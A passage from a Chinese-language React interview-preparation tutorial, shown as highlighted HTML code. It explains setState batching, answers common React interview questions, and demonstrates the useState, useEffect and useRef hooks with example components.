<span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> state <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token literal-property property">number</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">setState</span><span class="token punctuation">(</span><span class="token parameter">newSate</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token comment">//state={...state,...newSate}</span>
  <span class="token comment">// setState异步更新</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>isBatchingUpdate<span class="token punctuation">)</span><span class="token punctuation">{</span>
    queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newSate<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token comment">// setState同步更新</span>
    state<span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">...</span>state<span class="token punctuation">,</span><span class="token operator">...</span>newSate<span class="token punctuation">}</span>
  <span class="token punctuation">}</span>   
<span class="token punctuation">}</span>

<span class="token comment">// react事件是合成事件，在合成事件中isBatchingUpdate需要设置为true</span>
<span class="token comment">// 模拟react中事件点击</span>
<span class="token keyword">function</span> <span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  isBatchingUpdate<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// 批量更新标志</span>

  <span class="token comment">/**我们自己逻辑开始 */</span>
  <span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">number</span><span class="token operator">:</span>state<span class="token punctuation">.</span>number<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">number</span><span class="token operator">:</span>state<span class="token punctuation">.</span>number<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>
  <span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">number</span><span class="token operator">:</span>state<span class="token punctuation">.</span>number<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>
  <span class="token comment">/**我们自己逻辑结束 */</span>

  state<span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">newState<span class="token punctuation">,</span>action</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token operator">...</span>newState<span class="token punctuation">,</span><span class="token operator">...</span>action<span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>
<span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// setState笔试题考察 下面这道题输出什么</span>
<span class="token keyword">class</span> <span class="token class-name">Example</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token number">0</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// componentDidMount中isBatchingUpdate=true setState批量更新</span>
<span class="token function">componentDidMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">// 添加到queue队列中，等待处理</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span>
  <span class="token comment">// 第 1 次 log</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">// 添加到queue队列中，等待处理</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span>
  <span class="token comment">// 第 2 次 log</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// 在原生事件和setTimeout中（isBatchingUpdate=false），setState同步更新，可以马上获取更新后的值</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">// 同步更新</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span>
    <span class="token comment">// 第 3 次 log</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">// 同步更新</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span>
    <span class="token comment">// 第 4 次 log</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">null</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 答案：0, 0, 2, 3</span>
</code></pre></div></li></ul> <h3 id="react真题"><a href="#react真题" class="header-anchor">#</a> React真题</h3> <p><strong>1. 函数组件和class组件区别</strong></p> <ul><li>纯函数，输入<code>props</code>，输出<code>JSX</code></li> <li>没有实例、没有生命周期、没有<code>state</code></li> <li>不能拓展其他方法</li></ul> <p><strong>2. 什么是受控组件</strong></p> <ul><li>表单的值，受到<code>state</code>控制</li> <li>需要自行监听<code>onChange</code>，更新<code>state</code></li> <li>对比非受控组件</li></ul> <p><strong>3. 何时使用异步组件</strong></p> <ul><li>加载大组件</li> <li>路由懒加载</li></ul> <p><strong>4. 多个组件有公共逻辑如何抽离</strong></p> <ul><li><code>HOC</code>高阶组件</li> <li><code>Render Props</code></li> <li><code>React Hooks</code></li></ul> <p><strong>5. react router如何配置懒加载</strong></p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/bd495d045b61d7bc.png" loading="lazy" class="lazy"></p> <p><strong>6. react和vue的区别</strong></p> <p><strong>共同</strong></p> <ul><li>都支持组件化</li> <li>都是数据驱动视图</li> <li>都用<code>vdom</code>操作<code>DOM</code></li></ul> <p><strong>区别</strong></p> <ul><li><code>React</code>使用<code>JSX</code>拥抱<code>JS</code>，<code>Vue</code>使用模板拥抱<code>HTML</code></li> <li><code>React</code>函数式编程，<code>Vue</code>是声明式编程</li> <li><code>React</code>更多的是自力更生，<code>Vue</code>把你想要的都给你</li></ul> <h2 id="_7-react-hooks"><a href="#_7-react-hooks" class="header-anchor">#</a> 7 React Hooks</h2> <h3 id="class组件存在哪些问题"><a href="#class组件存在哪些问题" class="header-anchor">#</a> class组件存在哪些问题</h3> <ul><li><strong>函数组件的特点</strong> <ul><li>没有组件实例</li> <li>没有生命周期</li> <li>没有<code>state</code>和<code>setState</code>，只能接收<code>props</code></li></ul></li> <li><strong>class组件问题</strong> <ul><li>大型组件很难拆分和重构，很难测试</li> <li>相同的业务逻辑分散到各个方法中，逻辑混乱</li> <li>复用逻辑变得复杂，如<code>Mixins</code>、<code>HOC</code>、<code>Render Props</code></li></ul></li> <li><strong>react组件更易用函数表达</strong> <ul><li>React提倡函数式编程，<code>View = fn(props)</code></li> <li>函数更灵活，更易于拆分，更易测试</li> <li>但函数组件太简单，需要增强能力—— 使用<code>hooks</code></li></ul></li></ul> <h3 id="用usestate实现state和setstate功能"><a href="#用usestate实现state和setstate功能" class="header-anchor">#</a> 用useState实现state和setState功能</h3> <p><strong>让函数组件实现state和setState</strong></p> <ul><li>默认函数组件没有<code>state</code></li> <li>函数组件是一个纯函数，执行完即销毁，无法存储<code>state</code></li> <li>需要<code>state hook</code>，即把<code>state</code>“钩”到纯函数中（保存到闭包中）</li></ul> <p><strong>hooks命名规范</strong></p> <ul><li>规定所有的<code>hooks</code>都要以<code>use</code>开头，如<code>useXX</code></li> <li>自定义<code>hook</code>也要以<code>use</code>开头</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 使用hooks</span>
<span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span>

<span class="token keyword">function</span> <span class="token function">ClickCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 数组的解构</span>
    <span class="token comment">// useState 就是一个 Hook “钩”，最基本的一个 Hook</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// 传入一个初始值</span>

    <span class="token keyword">const</span> <span class="token punctuation">[</span>name<span class="token punctuation">,</span> setName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>

    <span class="token comment">// const arr = useState(0)</span>
    <span class="token comment">// const count = arr[0]</span>
    <span class="token comment">// const setCount = arr[1]</span>

    <span class="token keyword">function</span> <span class="token function">clickHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token function">setName</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">'2020'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>你点击了 <span class="token punctuation">{</span>count<span class="token punctuation">}</span> 次 <span class="token punctuation">{</span>name<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">{</span>clickHandler<span class="token punctuation">}</span><span class="token operator">&gt;</span>点击<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> ClickCounter
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 使用class</span>

<span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span>

<span class="token keyword">class</span> <span class="token class-name">ClickCounter</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token comment">// 定义 state</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token literal-property property">count</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'test'</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>你点击了 <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>count<span class="token punctuation">}</span> 次 <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>clickHandler<span class="token punctuation">}</span><span class="token operator">&gt;</span>点击<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
    <span class="token punctuation">}</span>
    <span class="token function-variable function">clickHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token comment">// 修改 state</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token literal-property property">count</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>
            <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">'2020'</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> ClickCounter
</code></pre></div><h3 id="用useeffect模拟组件生命周期"><a href="#用useeffect模拟组件生命周期" class="header-anchor">#</a> 用useEffect模拟组件生命周期</h3> <p><strong>让函数组件模拟生命周期</strong></p> <ul><li>默认函数组件没有生命周期</li> <li>函数组件是一个纯函数，执行完即销毁，自己无法实现生命周期</li> <li>使用<code>Effect Hook</code>把生命周期&quot;钩&quot;到纯函数中</li></ul> <p><strong>useEffect让纯函数有了副作用</strong></p> <ul><li>默认情况下，执行纯函数，输入参数，返回结果，无副作用</li> <li>所谓副作用，就是对函数之外造成影响，如设置全局定时器</li> <li>而组件需要副作用，所以需要有<code>useEffect</code>钩到纯函数中</li></ul> <p><strong>总结</strong></p> <ul><li>模拟<code>componentDidMount</code>，<code>useEffect</code>依赖<code>[]</code></li> <li>模拟<code>componentDidUpdate</code>，<code>useEffect</code>依赖<code>[a,b]</code>或者<code>useEffect(fn)</code>没有写第二个参数</li> <li>模拟<code>componentWillUnmount</code>，<code>useEffect</code>返回一个函数</li> <li>注意<code>useEffect(fn)</code>没有写第二个参数：同时模拟<code>componentDidMount</code> + <code>componentDidUpdate</code></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> useState<span class="token punctuation">,</span> useEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span>

<span class="token keyword">function</span> <span class="token function">LifeCycles</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>name<span class="token punctuation">,</span> setName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>

    <span class="token comment">// // 模拟 class 组件的 DidMount 和 DidUpdate</span>
    <span class="token comment">// useEffect(() =&gt; {</span>
    <span class="token comment">//     console.log('在此发送一个 ajax 请求')</span>
    <span class="token comment">// })</span>

    <span class="token comment">// // 模拟 class 组件的 DidMount</span>
    <span class="token comment">// useEffect(() =&gt; {</span>
    <span class="token comment">//     console.log('加载完了')</span>
    <span class="token comment">// }, []) // 第二个参数是 [] （不依赖于任何 state）</span>

    <span class="token comment">// // 模拟 class 组件的 DidUpdate</span>
    <span class="token comment">// useEffect(() =&gt; {</span>
    <span class="token comment">//     console.log('更新了')</span>
    <span class="token comment">// }, [count, name]) // 第二个参数就是依赖的 state</span>

    <span class="token comment">// 模拟 class 组件的 DidMount</span>
    <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">let</span> timerId <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>

        <span class="token comment">// 返回一个函数</span>
        <span class="token comment">// 模拟 WillUnMount</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            window<span class="token punctuation">.</span><span class="token function">clearInterval</span><span class="token punctuation">(</span>timerId<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">function</span> <span class="token function">clickHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token function">setName</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">'2020'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>你点击了 <span class="token punctuation">{</span>count<span class="token punctuation">}</span> 次 <span class="token punctuation">{</span>name<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">{</span>clickHandler<span class="token punctuation">}</span><span class="token operator">&gt;</span>点击<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> LifeCycles
</code></pre></div><h3 id="用useeffect模拟willunmount时的注意事项"><a href="#用useeffect模拟willunmount时的注意事项" class="header-anchor">#</a> 用useEffect模拟WillUnMount时的注意事项</h3> <p><strong>useEffect中返回函数</strong></p> <ul><li><code>useEffect</code>依赖项<code>[]</code>，组件销毁是执行<code>fn</code>，等于<code>willUnmount</code></li> <li><code>useEffect</code>第二个参数没有或依赖项<code>[a,b]</code>，组件更新时执行<code>fn</code>，即下次执行<code>useEffect</code>之前，就会执行<code>fn</code>，无论更新或卸载（<code>props</code>更新会导致<code>willUnmount</code>多次执行）</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span>

<span class="token keyword">class</span> <span class="token class-name">FriendStatus</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">props</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token literal-property property">status</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token comment">// 默认当前不在线</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
            好友 <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>friendId<span class="token punctuation">}</span> 在线状态：<span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>status<span class="token punctuation">}</span>
        <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
    <span class="token punctuation">}</span>
    <span class="token function">componentDidMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">开始监听 </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>friendId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> 的在线状态</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    <span class="token function">componentWillUnMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">结束监听 </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>friendId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> 的在线状态</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// friendId 更新</span>
    <span class="token function">componentDidUpdate</span><span class="token punctuation">(</span><span class="token parameter">prevProps</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">结束监听 </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>prevProps<span class="token punctuation">.</span>friendId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> 在线状态</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">开始监听 </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>friendId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> 在线状态</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> FriendStatus
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> useState<span class="token punctuation">,</span> useEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span>

<span class="token keyword">function</span> <span class="token function">FriendStatus</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> friendId <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>status<span class="token punctuation">,</span> setStatus<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>

    <span class="token comment">// DidMount 和 DidUpdate</span>
    <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">开始监听 </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>friendId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> 在线状态</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>

        <span class="token comment">// 【特别注意】</span>
        <span class="token comment">// 此处并不完全等同于 WillUnMount</span>
        <span class="token comment">// props 发生变化，即更新，也会执行结束监听</span>
        <span class="token comment">// 准确的说：返回的函数，会在下一次 effect 执行之前，被执行</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">结束监听 </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>friendId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> 在线状态</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
        好友 <span class="token punctuation">{</span>friendId<span class="token punctuation">}</span> 在线状态：<span class="token punctuation">{</span>status<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> FriendStatus
</code></pre></div><h3 id="useref和usecontext"><a href="#useref和usecontext" class="header-anchor">#</a> useRef和useContext</h3> <p><strong>1. useRef</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> useRef<span class="token punctuation">,</span> useEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span>

<span class="token keyword">function</span> <span class="token function">UseRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> btnRef <span class="token operator">=</span> <span class="token function">useRef</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token comment">// 初始值</span>

    <span class="token comment">// const numRef = useRef(0)</span>
    <span class="token comment">// numRef.current</span>

    <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>btnRef<span class="token punctuation">.</span>current<span class="token punctuation">)</span> <span class="token comment">// DOM 节点</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

